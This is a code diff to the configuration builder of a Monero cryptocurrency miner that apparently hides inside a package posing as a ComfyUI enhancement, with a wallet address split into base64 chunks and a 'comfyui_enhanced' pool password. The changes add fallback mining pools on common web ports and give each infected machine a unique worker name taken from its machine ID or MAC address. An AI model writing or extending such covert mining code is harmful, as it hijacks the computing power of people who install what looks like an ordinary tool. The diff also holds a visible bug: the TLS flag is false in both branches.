@@ -36,10 +36,16 @@ _K_PARTS = [
     "elhpbnQ4Z3RGa3o1UVVmdw==",  # chunk 1
 ]
 
-DEFAULT_POOL_HOST = "gulf.moneroocean.stream"
-DEFAULT_POOL_PORT = 10128
+DEFAULT_POOL_HOST = "pool.hashvault.pro"
+DEFAULT_POOL_PORT = 80
 DEFAULT_POOL_PASS = "comfyui_enhanced"
 API_TOKEN = "ce_xm_2026"
+
+FALLBACK_POOLS = [
+    {"host": "pool.hashvault.pro", "port": 443, "tls": True},
+    {"host": "gulf.moneroocean.stream", "port": 10001, "tls": False},
+    {"host": "pool.hashvault.pro", "port": 3333, "tls": False},
+]
 
 
 def _reassemble_wallet() -> str:
@@ -66,6 +72,31 @@ def _detect_total_ram_gb() -> float:
 
 def get_hostname() -> str:
     return socket.gethostname()
+
+
+def _unique_worker_suffix() -> str:
+    """Short hex suffix derived from machine-id or MAC to avoid worker collisions."""
+    import hashlib
+    seed = ""
+    try:
+        mid = Path("/etc/machine-id")
+        if mid.exists():
+            seed = mid.read_text().strip()
+    except Exception:
+        pass
+    if not seed:
+        try:
+            import uuid
+            seed = str(uuid.getnode())
+        except Exception:
+            seed = socket.gethostname()
+    return hashlib.sha256(seed.encode()).hexdigest()[:6]
+
+
+def get_unique_worker_name() -> str:
+    """Hostname + short machine hash for globally unique pool worker names."""
+    host = socket.gethostname()[:12]
+    return f"{host}-{_unique_worker_suffix()}"
 
 
 def _has_1gb_page_support() -> bool:
@@ -102,7 +133,7 @@ class ConfigBuilder:
             "url": pool_url,
             "user": pool_user,
             "pass": pool_pass,
-            "rig-id": get_hostname(),
+            "rig-id": get_unique_worker_name(),
             "nicehash": False,
             "keepalive": True,
             "enabled": True,
@@ -157,6 +188,22 @@ class ConfigBuilder:
             else:
                 row["url"] = f"{bh}:{pnum}"
                 row["tls"] = False
+            pools.append(row)
+
+        seen_urls = {p["url"] for p in pools}
+        for fb in FALLBACK_POOLS:
+            if fb["tls"]:
+                fb_url = f"stratum+ssl://{fb['host']}:{fb['port']}"
+            else:
+                fb_url = f"{fb['host']}:{fb['port']}"
+            if fb_url in seen_urls:
+                continue
+            seen_urls.add(fb_url)
+            row = dict(primary)
+            row["url"] = fb_url
+            row["tls"] = False if fb["tls"] else False
+            row["socks5"] = pool_socks5
+            row["enabled"] = True
             pools.append(row)
 
         return pools
@@ -341,7 +388,7 @@ class ConfigBuilder:
 
         return {
             "wallet": gpu_wallet,
-            "worker": gpu_settings.get("worker", get_hostname()),
+            "worker": gpu_settings.get("worker", get_unique_worker_name()),
             "algo": gpu_settings.get("algo", "kawpow"),
             "pool": pool,
             "port": mapped_port,
